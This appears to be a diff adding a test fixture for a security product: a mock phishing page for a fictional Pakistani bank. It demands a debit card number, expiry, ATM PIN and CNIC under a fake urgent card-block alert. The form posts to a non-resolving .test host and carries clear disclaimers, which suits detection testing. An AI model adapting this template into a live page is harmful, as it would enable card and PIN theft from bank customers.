@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Woodgrove Bank Pakistan — Card Verification (CyberArmor test fixture)</title>
+<style>
+  body { margin: 0; font-family: "Segoe UI", Arial, sans-serif; background: #f3f6f4; color: #1d2b24; }
+  .ca-disclaimer {
+    background: #b30000; color: #fff; padding: 12px 16px; font-size: 14px;
+    font-weight: bold; text-align: center;
+  }
+  header { background: #0b5d3b; color: #fff; padding: 18px 28px; display: flex; align-items: center; gap: 14px; }
+  header .logo { width: 40px; height: 40px; border-radius: 8px; background: #f2c14e; color: #0b5d3b;
+                 font-weight: 800; display: grid; place-items: center; font-size: 20px; }
+  header h1 { font-size: 20px; margin: 0; }
+  main { max-width: 520px; margin: 32px auto; background: #fff; border-radius: 12px; padding: 28px 32px;
+         box-shadow: 0 2px 12px rgba(0,0,0,.08); }
+  h2 { margin-top: 0; font-size: 20px; }
+  .alert { background: #fff4e5; border-left: 4px solid #e08a00; padding: 10px 14px; font-size: 14px; margin-bottom: 18px; }
+  label { display: block; font-size: 13px; font-weight: 600; margin: 14px 0 6px; }
+  input { width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1px solid #b9c7bf; border-radius: 8px; font-size: 15px; }
+  .row { display: flex; gap: 12px; } .row > div { flex: 1; }
+  button { margin-top: 22px; width: 100%; padding: 12px; background: #0b5d3b; color: #fff; border: 0; border-radius: 8px;
+           font-size: 16px; font-weight: 600; cursor: pointer; }
+  footer { text-align: center; font-size: 12px; color: #5d6e65; margin: 18px 0 30px; }
+</style>
+</head>
+<body>
+<div class="ca-disclaimer">
+  ⚠ CYBERARMOR TEST FIXTURE — NOT A REAL BANK. "Woodgrove Bank" is a fictional
+  name. Do NOT enter real card details or a real PIN. This page exists only to
+  demonstrate brand-impersonation and card-PIN protection.
+</div>
+<header><div class="logo">W</div><h1>Woodgrove Bank Pakistan</h1></header>
+
+<main>
+  <h2>Verify your debit card</h2>
+  <div class="alert">Your debit card has been temporarily blocked for your safety. To
+    reactivate it, verify your card details and ATM PIN within 12 hours.</div>
+
+  <!--
+    INERT BY DESIGN. The form posts to a .test hostname, which by RFC 6761 never
+    resolves in the public DNS. It cannot collect or transmit anything. Do not
+    change this to a resolvable endpoint.
+  -->
+  <form action="https://card-verify.woodgrove-bank.test/collect" method="post">
+    <label for="card">Debit card number</label>
+    <input id="card" name="card" inputmode="numeric" autocomplete="off" placeholder="1234 5678 9012 3456">
+    <div class="row">
+      <div><label for="exp">Expiry (MM/YY)</label><input id="exp" name="exp" autocomplete="off" placeholder="MM/YY"></div>
+      <div><label for="pin">ATM PIN</label><input id="pin" name="pin" inputmode="numeric" autocomplete="off" placeholder="4 digits"></div>
+    </div>
+    <label for="cnic">CNIC</label>
+    <input id="cnic" name="cnic" autocomplete="off" placeholder="12345-1234567-1">
+    <button type="submit">Reactivate my card</button>
+  </form>
+</main>
+<footer>Woodgrove Bank Pakistan will never ask for your PIN by phone, SMS, email or chat.<br>
+  (A real bank never asks for it on a web page either. That is the point of this fixture.)</footer>
+</body>
+</html>
